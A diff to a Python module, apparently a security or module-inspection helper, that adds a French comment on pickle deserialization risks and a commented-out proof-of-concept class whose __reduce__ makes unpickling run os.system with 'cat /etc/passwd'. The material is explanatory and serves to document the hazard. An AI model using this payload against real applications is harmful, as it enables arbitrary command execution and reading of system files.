@@ -14,6 +14,29 @@ _valide_features = {
     "importlib",
 }
 
+# TODO Lors de la désérialisation d'un flux pickle, Python exécute les instructions
+#  contenues dans le flux pour reconstruire l'objet. Si un attaquant peut modifier ou
+#  injecter un flux pickle malveillant, il peut inclure des instructions qui appellent
+#  des fonctions du système d'exploitation (comme os.system ou subprocess.run),
+#  exécutent des scripts, ou manipulent des fichiers.
+
+# import os
+# import pickle
+#
+# class Exploit:
+#     def __reduce__(self):
+#         # This method is called by pickle to "reduce" the object
+#         # for serialization. An attacker can craft this to point
+#         # to arbitrary functions and arguments.
+#         return (os.system, ('echo PWNED! ; cat /etc/passwd',))
+#
+# # This is the "malicious" object. If an attacker can get you to unpickle this,
+# # os.system('echo PWNED! ; cat /etc/passwd') will be executed.
+# malicious_pickle = pickle.dumps(Exploit())
+#
+# # If a vulnerable application does:
+# # pickle.loads(malicious_pickle)
+# # It will execute the command.
 
 def _is_system_module(module:ModuleType) -> bool:
     # Cas 1: Module intégré (pas de fichier associé)
